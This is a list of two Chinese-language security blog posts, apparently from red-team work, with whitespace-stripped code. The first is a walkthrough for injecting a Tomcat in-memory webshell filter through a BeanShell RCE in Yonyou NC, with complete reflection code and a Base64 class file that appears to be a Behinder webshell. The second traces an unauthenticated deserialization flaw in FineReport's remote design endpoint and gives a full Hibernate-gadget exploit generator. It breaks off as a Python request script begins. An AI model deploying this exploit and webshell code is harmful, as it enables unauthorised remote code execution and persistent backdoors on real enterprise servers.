<?xml version="1.0" encoding="utf-8"?>
<ul>
  <li>背景项目遇到用友NC只存在BeanShell远程代码执行漏洞，写入jsp访问404，尝试通过BeanShell注入内存马，本篇文章主要记录过程中遇到的一些问题。request对象通过java-object-searcher获取request对象后，发现Tomcat6无法通过request对象获取StandardContext，仅能获取Header。importcom.sun.org.apache.xalan.internal.xsltc.DOM;importcom.sun.org.apache.xalan.internal.xsltc.TransletException;importcom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;importcom.sun.org.apache.xml.internal.dtm.DTMAxisIterator;importcom.sun.org.apache.xml.internal.serializer.SerializationHandler;importorg.apache.tomcat.util.buf.ByteChunk;importjava.lang.reflect.Field;importjava.util.ArrayList;try{Objectobj=Thread.currentThread();Fieldfield=obj.getClass().getSuperclass().getDeclaredField("group");field.setAccessible(true);obj=field.get(obj);field=obj.getClass().getDeclaredField("threads");field.setAccessible(true);obj=field.get(obj);Thread[]threads=(Thread[])obj;for(Threadthread:threads){if(thread.getName().contains("http")&amp;&amp;thread.getName().contains("Acceptor")){try{field=thread.getClass().getDeclaredField("target");field.setAccessible(true);obj=field.get(thread);field=obj.getClass().getDeclaredField("this$0");field.setAccessible(true);obj=field.get(obj);field=obj.getClass().getDeclaredField("handler");field.setAccessible(true);obj=field.get(obj);field=obj.getClass().getSuperclass().getDeclaredField("global");field.setAccessible(true);obj=field.get(obj);field=obj.getClass().getDeclaredField("processors");field.setAccessible(true);obj=field.get(obj);java.util.ArrayListprocessors=(java.util.ArrayList)obj;for(Objecto:processors){try{field=o.getClass().getDeclaredField("req");field.setAccessible(true);obj=field.get(o);org.apache.coyote.Requestrequest=(org.apache.coyote.Request)obj;org.apache.coyote.Responseresp=request.getResponse();}catch(Exceptione){e.printStackTrace();}}}catch(Exceptione){e.printStackTrace();}}}}catch(Exceptione){e.printStackTrace();}StandardContext查阅发现bitterz师傅的文章提供了Tomcat全版本获取StandardContext的思路。tomcat678currentThread-&gt;threadGroup-&gt;for(threads)-&gt;target-&gt;this$0-&gt;handler-&gt;proto-&gt;adapter-&gt;connector-&gt;service-&gt;container-&gt;children(一个HashMap，get获取standardHost)-&gt;standardHost-&gt;children(一个HashMap，get获取standardContext)测试发现文中代码从HashMap中获取standardHost时，key键为localhost，通过serverName获取会导致远程访问时出现空指针，bitterz师傅也曾在评论区留言提供解决思路。通过以下修改将通过serverName获取修改为遍历StandardHost。Iteratoriterator2=children.keySet().iterator();while(iterator2.hasNext()){StandardHoststandardHost=(StandardHost)children.get(iterator2.next());field=standardHost.getClass().getSuperclass().getDeclaredField("children");field.setAccessible(true);children=(HashMap)field.get(standardHost);Iteratoriterator3=children.keySet().iterator();while(iterator3.hasNext()){StringcontextKey=(String)iterator3.next();if(!(uri.startsWith(contextKey))){continue;}StandardContextstandardContext=(StandardContext)children.get(contextKey);}}获取StandardContext后尝试注入Filter，在通过defineClass加载字节码时，发现由于用友NC自带jdk为1.7.0_51，没有java.util.Base64类，需要使用sun.misc.BASE64Decoder进行Base64解码。ClassLoaderclzLoader=Thread.currentThread().getContextClassLoader();StringclzBytecodeBase64Str="";byte[]bytecode=null;try{Classbase64=clzLoader.loadClass("sun.misc.BASE64Decoder");Objectdecoder=base64.newInstance();bytecode=(byte[])decoder.getClass().getMethod("decodeBuffer",newClass[]{String.class}).invoke(decoder,clzBytecodeBase64Str);}catch(Exceptione){}此时发现代码不能执行，一直抛出异常。调试发现BeanShell对于反射通过bsh.Reflect进行处理，可变参数必须按照参数类型传参，修改为如下代码。ClassLoaderclzLoader=Thread.currentThread().getContextClassLoader();StringclzBytecodeBase64Str="";byte[]bytecode=null;try{Classbase64=clzLoader.loadClass("sun.misc.BASE64Decoder");Objectdecoder=base64.newInstance();bytecode=(byte[])decoder.getClass().getMethod("decodeBuffer",newClass[]{String.class}).invoke(decoder,newObject[]{clzBytecodeBase64Str});}catch(Exceptione){}注入filter注入filter流程：通过defineClass加载恶意filter类后，使用filterDef封装filter对象，调用StandardContext的addFilterDef存到FilterDefs，创建filterMap对象后调用StandardContext的addFilterMap存到FilterMaps，使用ApplicationFilterConfig封装filterDef存到filterConfigs。java.lang.reflect.MethoddefineClzMethod=clzLoader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass",newClass[]{String.class,byte[].class,int.class,int.class});defineClzMethod.setAccessible(true);ClassfilterClass=(Class)defineClzMethod.invoke((Object)clzLoader,newObject[]{null,bytecode,0,bytecode.length});ObjectfilterDef=Class.forName("org.apache.catalina.deploy.FilterDef").getConstructor(newClass[]{}).newInstance(newObject[]{});java.lang.reflect.MethodsetFilterName=filterDef.getClass().getDeclaredMethod("setFilterName",newClass[]{String.class});setFilterName.invoke(filterDef,newObject[]{"TestFilter"});java.lang.reflect.MethodsetFilterClass=filterDef.getClass().getDeclaredMethod("setFilterClass",newClass[]{String.class});setFilterClass.invoke(filterDef,newObject[]{filterClass.getName()});java.lang.reflect.MethodaddFilterDef=standardContext.getClass().getDeclaredMethod("addFilterDef",newClass[]{org.apache.catalina.deploy.FilterDef.class});addFilterDef.invoke(standardContext,newObject[]{filterDef});ObjectfilterMap=Class.forName("org.apache.catalina.deploy.FilterMap").getConstructor(newClass[]{}).newInstance(newObject[]{});java.lang.reflect.MethodsetFilterName2=filterMap.getClass().getDeclaredMethod("setFilterName",newClass[]{String.class});setFilterName2.invoke(filterMap,newObject[]{"TestFilter"});java.lang.reflect.MethodsetDispatcher=filterMap.getClass().getDeclaredMethod("setDispatcher",newClass[]{String.class});java.lang.reflect.MethodaddURLPattern=filterMap.getClass().getDeclaredMethod("addURLPattern",newClass[]{String.class});setDispatcher.invoke(filterMap,newObject[]{"REQUEST"});addURLPattern.invoke(filterMap,newObject[]{"/*"});java.lang.reflect.MethodaddFilterMap=standardContext.getClass().getDeclaredMethod("addFilterMap",newClass[]{org.apache.catalina.deploy.FilterMap.class});addFilterMap.invoke(standardContext,newObject[]{filterMap});java.lang.reflect.ConstructorfilterConfigConstructor=Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(newClass[]{Class.forName("org.apache.catalina.Context"),Class.forName("org.apache.catalina.deploy.FilterDef")});filterConfigConstructor.setAccessible(true);ObjectfilterConfig=filterConfigConstructor.newInstance(newObject[]{standardContext,filterDef});FieldfilterConfigsField=standardContext.getClass().getDeclaredField("filterConfigs");filterConfigsField.setAccessible(true);HashMapfilterConfigsMap=(HashMap)filterConfigsField.get(standardContext);filterConfigsMap.put("TestFilter",filterConfig);完整代码冰蝎3.0rebeyondimportorg.apache.catalina.core.StandardContext;importorg.apache.catalina.core.StandardEngine;importorg.apache.catalina.core.StandardHost;importjava.lang.reflect.Field;importjava.util.HashMap;importjava.util.Iterator;try{Objectobject;StringserverName;Objectobj=Thread.currentThread();Fieldfield=obj.getClass().getSuperclass().getDeclaredField("group");field.setAccessible(true);obj=field.get(obj);field=obj.getClass().getDeclaredField("threads");field.setAccessible(true);obj=field.get(obj);Thread[]threads=(Thread[])obj;for(Threadthread:threads){if(thread.getName().contains("exec")||thread==null){continue;}try{field=thread.getClass().getDeclaredField("target");field.setAccessible(true);Objecttarget=field.get(thread);if(!(targetinstanceofRunnable)){continue;}try{field=target.getClass().getDeclaredField("this$0");field.setAccessible(true);Objectpoint=field.get(target);field=point.getClass().getDeclaredField("handler");field.setAccessible(true);Objecthandler=field.get(point);field=handler.getClass().getSuperclass().getDeclaredField("global");field.setAccessible(true);object=field.get(handler);}catch(Exceptione){continue;}if(object==null){continue;}field=object.getClass().getDeclaredField("processors");field.setAccessible(true);Objectobj2=field.get(object);java.util.ArrayListprocessors=(java.util.ArrayList)obj2;Iteratoriterator=processors.iterator();while(iterator.hasNext()){Objectnext=iterator.next();field=next.getClass().getDeclaredField("req");field.setAccessible(true);Objectreq=field.get(next);field=req.getClass().getDeclaredField("serverPort");field.setAccessible(true);ObjectserverPort=field.get(req);if(serverPort.equals(-1)){continue;}field=req.getClass().getDeclaredField("serverNameMB");field.setAccessible(true);org.apache.tomcat.util.buf.MessageBytesserverNameMB=(org.apache.tomcat.util.buf.MessageBytes)field.get(req);field=serverNameMB.getClass().getDeclaredField("strValue");field.setAccessible(true);serverName=(String)field.get(serverNameMB);if(serverName==null){serverName=serverNameMB.toString();}if(serverName==null){serverName=serverNameMB.getString();}field=req.getClass().getDeclaredField("decodedUriMB");field.setAccessible(true);org.apache.tomcat.util.buf.MessageBytesuriMB=(org.apache.tomcat.util.buf.MessageBytes)field.get(req);field=uriMB.getClass().getDeclaredField("strValue");field.setAccessible(true);Stringuri=(String)field.get(uriMB);if(uri==null){uri=uriMB.toString();}if(uri==null){uri=uriMB.getString();}Thread[]threads2=(Thread[])obj;for(Threadthread2:threads2){if(thread2.getName().contains("http")&amp;&amp;thread2.getName().contains("Acceptor")){try{field=thread2.getClass().getDeclaredField("target");field.setAccessible(true);obj=field.get(thread2);try{field=obj.getClass().getDeclaredField("this$0");field.setAccessible(true);Objectpoint=field.get(obj);if(point==null){try{field=obj.getClass().getDeclaredField("endpoint");field.setAccessible(true);obj=field.get(obj);point=obj;}catch(Exceptione){}}field=point.getClass().getDeclaredField("handler");field.setAccessible(true);Objecthandler=field.get(point);field=handler.getClass().getDeclaredField("proto");field.setAccessible(true);Objectproto=field.get(handler);Fieldf=proto.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adapter");f.setAccessible(true);Objectadapter=f.get(proto);field=adapter.getClass().getDeclaredField("connector");field.setAccessible(true);Objectconnector=field.get(adapter);field=connector.getClass().getDeclaredField("service");field.setAccessible(true);Objectservice=field.get(connector);StandardEngineengine=null;try{field=service.getClass().getDeclaredField("container");field.setAccessible(true);engine=(StandardEngine)field.get(service);}catch(Exceptione){}if(engine==null){field=service.getClass().getDeclaredField("engine");field.setAccessible(true);engine=(StandardEngine)field.get(service);}field=engine.getClass().getSuperclass().getDeclaredField("children");field.setAccessible(true);HashMapchildren=(HashMap)field.get(engine);Iteratoriterator2=children.keySet().iterator();while(iterator2.hasNext()){StandardHoststandardHost=(StandardHost)children.get(iterator2.next());field=standardHost.getClass().getSuperclass().getDeclaredField("children");field.setAccessible(true);children=(HashMap)field.get(standardHost);Iteratoriterator3=children.keySet().iterator();while(iterator3.hasNext()){StringcontextKey=(String)iterator3.next();if(!(uri.startsWith(contextKey))){continue;}StandardContextstandardContext=(StandardContext)children.get(contextKey);standardContext=standardContext;ClassLoaderclzLoader=Thread.currentThread().getContextClassLoader();StringclzBytecodeBase64Str="yv66vgAAADMAugoAJABYCABZCQArAFoHAFsKAAQAWAcAXAsABgBdCABeCgAEAF8IAGAIADsIAGELAGIAYwgAZAoAZQBmBwBnCgBoAGkKABAAagoAZQBrCABsCgAXAG0IAG4HAG8HAEIJAHAAcQoAFwByCgBzAHQHAHUKABwAWAsAdgB3CgB4AHkKABwAegoAZQB7CgAkAHwKABcAfQcAfgoAcAB/CgBzAIAKABcAgQoAJACCBwCDCwCEAIUHAIYHAIcBAAFrAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MVGVzdEZpbHRlcjI7AQAHZGVzdHJveQEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAC3BhZ2VDb250ZXh0AQATTGphdmEvdXRpbC9IYXNoTWFwOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAZtZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADmV2aWxjbGFzc19ieXRlAQACW0IBAAlldmlsY2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAANyZXEBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQANU3RhY2tNYXBUYWJsZQcAgwEACkV4Y2VwdGlvbnMHAIgHAIkBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEABmNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApTb3VyY2VGaWxlAQAQVGVzdEZpbHRlcjIuamF2YQwALwAwAQAQZTQ1ZTMyOWZlYjVkOTI1YgwALQAuAQARamF2YS91dGlsL0hhc2hNYXABACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACKAIsBAAdyZXF1ZXN0DACMAI0BAAhyZXNwb25zZQEAAXUHAI4MAI8AkAEAA0FFUwcAkQwAkgCTAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwcAlAwAlQCWDAAvAJcMAFIAmAEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgwAmQCaAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MHAJsMAJwARAwAnQCeBwCfDACgAKEBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyBwCiDACjAKQHAKUMAKYApwwAqACpDACqAKsMAKwArQwArgCvAQAQamF2YS9sYW5nL09iamVjdAwAsACxDACyALMMALQAtQwAtgC3AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAuAwANwC5AQALVGVzdEZpbHRlcjIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAEGphdmEvbGFuZy9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhACsAJAABACwAAQAAAC0ALgAAAAQAAQAvADAAAQAxAAAAPQACAAEAAAALKrcAASoSArUAA7EAAAACADIAAAAOAAMAAAANAAQACwAKAA8AMwAAAAwAAQAAAAsANAA1AAAAAQA2ADAAAQAxAAAAKwAAAAEAAAABsQAAAAIAMgAAAAYAAQAAABIAMwAAAAwAAQAAAAEANAA1AAAAAQA3ADgAAgAxAAAB0gAGAAsAAADfuwAEWbcABToEK8AABrkABwEAOgUZBBIIK7YACVcZBBIKLLYACVcZBBILGQW2AAlXEgI6BhkFEgwZBrkADQMAEg64AA86BxkHBbsAEFkZBrYAERIOtwAStgATEhS4ABUSFga9ABdZAxMAGFNZBLIAGVNZBbIAGVO2ABo6CBkIBLYAGxkHuwAcWbcAHSu5AB4BALYAH7YAILYAIToJGQgqtgAitgAjBr0AJFkDGQlTWQQDuAAlU1kFGQm+uAAlU7YAJsAAFzoKGQq2ACcZBLYAKFenAAU6BC0rLLkAKgMAsQABAAAA0QDUACkAAwAyAAAASgASAAAAFwAJABgAFAAaAB0AGwAmABwAMAAdADQAHgA/AB8ARgAgAFoAIQB8ACIAggAjAJwAJADGACUA0QAoANQAJwDWACkA3gAqADMAAAB6AAwACQDIADkAOgAEABQAvQA7ADwABQA0AJ0ALQAuAAYARgCLAD0APgAHAHwAVQA/AEAACACcADUAQQBCAAkAxgALAEMARAAKANYAAABFAEYABAAAAN8ANAA1AAAAAADfAEcASAABAAAA3wBJAEoAAgAAAN8ASwBMAAMATQAAAAkAAvcA1AcATgEATwAAAAYAAgBQAFEAAQBSAFMAAgAxAAAANQAAAAIAAAABsQAAAAIAMgAAAAYAAQAAAC4AMwAAABYAAgAAAAEANAA1AAAAAAABAFQAVQABAE8AAAAEAAEAUAABAFYAAAACAFc=";byte[]bytecode=null;try{Classbase64Clz=clzLoader.loadClass("sun.misc.BASE64Decoder");Objectdecoder=base64Clz.newInstance();bytecode=(byte[])decoder.getClass().getMethod("decodeBuffer",newClass[]{String.class}).invoke(decoder,newObject[]{clzBytecodeBase64Str});Stringresult=newString(bytecode);}catch(Exceptione){}java.lang.reflect.MethoddefineClzMethod=clzLoader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass",newClass[]{String.class,byte[].class,int.class,int.class});defineClzMethod.setAccessible(true);ClassfilterClass=(Class)defineClzMethod.invoke((Object)clzLoader,newObject[]{null,bytecode,0,bytecode.length});ObjectfilterDef=Class.forName("org.apache.catalina.deploy.FilterDef").getConstructor(newClass[]{}).newInstance(newObject[]{});java.lang.reflect.MethodsetFilterName=filterDef.getClass().getDeclaredMethod("setFilterName",newClass[]{String.class});setFilterName.invoke(filterDef,newObject[]{"TestFilter"});java.lang.reflect.MethodsetFilterClass=filterDef.getClass().getDeclaredMethod("setFilterClass",newClass[]{String.class});setFilterClass.invoke(filterDef,newObject[]{filterClass.getName()});java.lang.reflect.MethodaddFilterDef=standardContext.getClass().getDeclaredMethod("addFilterDef",newClass[]{org.apache.catalina.deploy.FilterDef.class});addFilterDef.invoke(standardContext,newObject[]{filterDef});ObjectfilterMap=Class.forName("org.apache.catalina.deploy.FilterMap").getConstructor(newClass[]{}).newInstance(newObject[]{});java.lang.reflect.MethodsetFilterName2=filterMap.getClass().getDeclaredMethod("setFilterName",newClass[]{String.class});setFilterName2.invoke(filterMap,newObject[]{"TestFilter"});java.lang.reflect.MethodsetDispatcher=filterMap.getClass().getDeclaredMethod("setDispatcher",newClass[]{String.class});java.lang.reflect.MethodaddURLPattern=filterMap.getClass().getDeclaredMethod("addURLPattern",newClass[]{String.class});setDispatcher.invoke(filterMap,newObject[]{"REQUEST"});addURLPattern.invoke(filterMap,newObject[]{"/*"});java.lang.reflect.MethodaddFilterMap=standardContext.getClass().getDeclaredMethod("addFilterMap",newClass[]{org.apache.catalina.deploy.FilterMap.class});addFilterMap.invoke(standardContext,newObject[]{filterMap});java.lang.reflect.ConstructorfilterConfigConstructor=Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(newClass[]{Class.forName("org.apache.catalina.Context"),Class.forName("org.apache.catalina.deploy.FilterDef")});filterConfigConstructor.setAccessible(true);ObjectfilterConfig=filterConfigConstructor.newInstance(newObject[]{standardContext,filterDef});FieldfilterConfigsField=standardContext.getClass().getDeclaredField("filterConfigs");filterConfigsField.setAccessible(true);HashMapfilterConfigsMap=(HashMap)filterConfigsField.get(standardContext);filterConfigsMap.put("TestFilter",filterConfig);}}}catch(Exceptione){}}catch(Exceptione){}}}}}catch(Exceptione){continue;}}}catch(Exceptione){}```参考链接https://xz.aliyun.com/t/9914https://github.com/c0ny1/java-object-searcher</li>
  <li>前言hw期间拿到的漏洞，修改exp的计划拖了很久，趁年底尝试一下从0到1进行挖掘。漏洞挖掘过程查看com.fr.decision.base.DecisionServletInitializer#start发现加载配置类DecisionConfiguration.class。publicvoidstart(){ServletContextvar1=(ServletContext)this.getModule().upFindSingleton(ServletContext.class);if(var1!=null){AnnotationConfigWebApplicationContextvar2=(AnnotationConfigWebApplicationContext)this.getModule().upFindSingleton(AnnotationConfigWebApplicationContext.class);...var2.register(DecisionConfiguration.class);...}}跟进com.fr.decision.base.DecisionConfiguration，发现addInterceptors方法中，DecisionInterceptor将/remote/design排除不进行拦截，所以com.fr.decision.extension.report.api.remote.RemoteDesignResource中路径都存在未授权访问。publicvoidaddInterceptors(InterceptorRegistryvar1){...var1.addInterceptor(newDecisionInterceptor()).addPathPatterns("/**").excludePathPatterns("/remote/design/**").excludePathPatterns("/v10/deployment/**").excludePathPatterns("/v5/design/widget/data").excludePathPatterns("/v5/design/tables/fields").excludePathPatterns("/export/check/**");...}查看该类中方法，跟进com.fr.decision.webservice.v10.remote.RemoteDesignService#onMessage查看业务逻辑。publicvoidonMessage(HttpServletRequestvar1,HttpServletResponsevar2)throwsException{byte[]var3=IOUtils.inputStream2Bytes(var1.getInputStream());var2.getOutputStream().write(WorkContext.handleMessage(var3));}这里将var1传递到WorkContext.handleMessage()，继续跟进到com.fr.workspace.WorkContext#handleMessage，此处的com.fr.workspace.connect.WorkspaceMessageHandler为接口类。publicstaticbyte[]handleMessage(byte[]var0){if(messageListener==null){thrownewRuntimeException("Invalidserver.");}else{returnmessageListener.handleMessage(var0);}}继续跟进到com.fr.workspace.engine.rpc.WorkspaceServerInvoker#handleMessage，进入deserializeInvocation。publicbyte[]handleMessage(byte[]var1){FineResultvar2=newFineResult();try{Invocationvar3=null;try{var3=this.deserializeInvocation(var1,var2);}catch(Exceptionvar12){returnthis.serializeResult(var2);}...}catch(Throwablevar15){FineLoggerFactory.getLogger().error(var15.getMessage(),var15);returnnewbyte[0];}}继续查看com.fr.workspace.engine.rpc.WorkspaceServerInvoker#deserializeInvocation，发现调用SerializerHelper.deserialize，GZipSerializerWrapper.wrap(InvocationSerializer.getDefault())将GZipSerializerWrapper的反序列化器设置为InvocationSerializer。privateInvocationdeserializeInvocation(byte[]var1,FineResultvar2)throwsException{try{return(Invocation)SerializerHelper.deserialize(var1,GZipSerializerWrapper.wrap(InvocationSerializer.getDefault()));}catch(Exceptionvar4){var2.setResult((Object)null);var2.setException(var4);throwvar4;}}然后查看com.fr.serialization.SerializerHelper#deserialize(byte[],com.fr.serialization.Serializer&lt;T&gt;)，此处的var1为GZipSerializerWrapper。publicstatic&lt;T&gt;Tdeserialize(byte[]var0,Serializer&lt;T&gt;var1)throwsException{if(var1==null){var1=SerializerSummaryAdaptor.get();}ByteArrayInputStreamvar2=newByteArrayInputStream(var0);returnvar1.deserialize(var2);}GZipSerializerWrapper.deserialize()对传入参数进行Gzip解码，然后传递给InvocationSerializer.deserialize()。publicTdeserialize(InputStreamvar1)throwsException{GZIPInputStreamvar2=newGZIPInputStream(var1);returnthis.serializer.deserialize(var2);}继续跟进com.fr.rpc.serialization.InvocationSerializer#deserialize，发现JDKSerializer.CustomObjectInputStream存在反序列化过滤，黑名单/com/fr/serialization/blacklist.txt，但生成Invocation对象后调用了readParams。publicInvocationdeserialize(InputStreamvar1)throwsException{DKSerializer.CustomObjectInputStreamvar2=newJDKSerializer.CustomObjectInputStream(var1);InvocationSerializer.InvocationPackvar3=(InvocationSerializer.InvocationPack)var2.readObject();Mapvar4=(Map)var2.readObject();Invocationvar5=var3.toInvocation(this.readParams(var3.params));var5.getMetadata().putAll(var4);returnvar5;}跟进com.fr.rpc.serialization.InvocationSerializer#readParams，此处再次调用SerializerHelper.deserialize进行反序列化，此方法不存在过滤。privateObject[]readParams(byte[][]var1)throwsException{Object[]var2=newObject[var1.length];for(intvar3=0;var3&lt;var1.length;++var3){var2[var3]=SerializerHelper.deserialize(var1[var3],this.paramSerializer);}returnvar2;}构造exp根据上文，构造com.fr.rpc.serialization.InvocationSerializer$InvocationPack对象，将序列化数据写入params。发送exp时，JDKSerializer.CustomObjectInputStream读取到的类为com.fr.rpc.serialization.InvocationSerializer$InvocationPack，通过黑名单检测后，com.fr.rpc.serialization.InvocationSerializer#readParams进行二次反序列化。反序列化过程中进行了一次Gzip解码，需要对生成的序列化数据进行Gzip编码后发送。packagefinereport;importcom.fr.rpc.Invocation;importcom.fr.third.org.hibernate.engine.spi.TypedValue;importcom.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer;importcom.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer;importcom.fr.third.org.hibernate.type.AbstractType;importcom.fr.third.org.hibernate.type.ComponentType;importysoserial.payloads.ObjectPayload;importysoserial.payloads.util.Gadgets;importysoserial.payloads.util.Reflections;importjava.io.*;importjava.lang.reflect.*;importjava.util.Base64;importjava.util.stream.Stream;importjava.util.zip.GZIPOutputStream;publicclassexp{publicstaticvoidmain(String[]args)throwsException{Stringcommand="calc.exe";Classclazz3=Class.forName("finereport.HibernatePoc");ObjectPayload&lt;?&gt;payload=(ObjectPayload&lt;?&gt;)clazz3.newInstance();finalObjectobjBefore=payload.getObject(command);ByteArrayOutputStreamb1=newByteArrayOutputStream();ObjectOutputStreamoos=newObjectOutputStream(b1);oos.writeObject(objBefore);oos.close();b1.close();Classclazz=Class.forName("com.fr.rpc.Invocation");Constructorm=clazz.getDeclaredConstructor(Method.class,Object[].class);m.setAccessible(true);Invocationinv=(Invocation)m.newInstance(clazz.getMethod("getMethod"),Stream.of(b1).toArray());Classclazz2=Class.forName("com.fr.rpc.serialization.InvocationSerializer$InvocationPack");Constructorm2=clazz2.getDeclaredConstructor(String.class,String.class,Class[].class,byte[][].class);m2.setAccessible(true);byte[][]bytes=newbyte[1][];bytes[0]=b1.toByteArray();ObjectOutputStreamoos2=newObjectOutputStream(newFileOutputStream("xxx.ser"));oos2.writeObject(m2.newInstance(null,null,null,bytes));oos2.writeObject(inv.getMetadata());oos2.close();System.out.println(Base64.getEncoder().encodeToString(compress(newFileInputStream("xxx.ser"))));}privatestaticbyte[]compress(FileInputStreamfis)throwsException{ByteArrayOutputStreambos=newByteArrayOutputStream();GZIPOutputStreamgos=newGZIPOutputStream(bos);intcount;bytedata[]=newbyte[8092];while((count=fis.read(data,0,8092))!=-1){gos.write(data,0,count);}gos.finish();gos.flush();gos.close();returnbos.toByteArray();}}classHibernatePocimplementsObjectPayload&lt;Object&gt;{publicObjectgetObject(Strings)throwsException{Objecttpl=Gadgets.createTemplatesImpl(s);Objectgetters=makeHibernate5Getter(tpl.getClass(),"getOutputProperties");returnmakeHibernate45Caller(tpl,getters);}staticObjectmakeHibernate45Caller(Objecttpl,Objectgetters)throwsException{PojoComponentTuplizertup=Reflections.createWithoutConstructor(PojoComponentTuplizer.class);Reflections.getField(AbstractComponentTuplizer.class,"getters").set(tup,getters);ComponentTypet=Reflections.createWithConstructor(ComponentType.class,AbstractType.class,newClass[0],newObject[0]);Reflections.setFieldValue(t,"componentTuplizer",tup);Reflections.setFieldValue(t,"propertySpan",1);Reflections.setFieldValue(t,"propertyTypes",newcom.fr.third.org.hibernate.type.Type[]{t});TypedValuev1=newTypedValue(t,null);Reflections.setFieldValue(v1,"value",tpl);Reflections.setFieldValue(v1,"type",t);TypedValuev2=newTypedValue(t,null);Reflections.setFieldValue(v2,"value",tpl);Reflections.setFieldValue(v2,"type",t);returnGadgets.makeMap(v1,v2);}publicstaticObjectmakeHibernate5Getter(Class&lt;?&gt;tplClass,Stringmethod)throwsNoSuchMethodException,SecurityException,ClassNotFoundException,InstantiationException,IllegalAccessException,IllegalArgumentException,InvocationTargetException{Class&lt;?&gt;getterIf=Class.forName("com.fr.third.org.hibernate.property.access.spi.Getter");Class&lt;?&gt;basicGetter=Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");Constructor&lt;?&gt;bgCon=basicGetter.getConstructor(Class.class,String.class,Method.class);Objectg=bgCon.newInstance(tplClass,"test",tplClass.getDeclaredMethod(method));Objectarr=Array.newInstance(getterIf,1);Array.set(arr,0,g);returnarr;}}生成payload填入data，即可rce。importgzip,base64,requestsurl="http://127.0.0.1:8075/webroo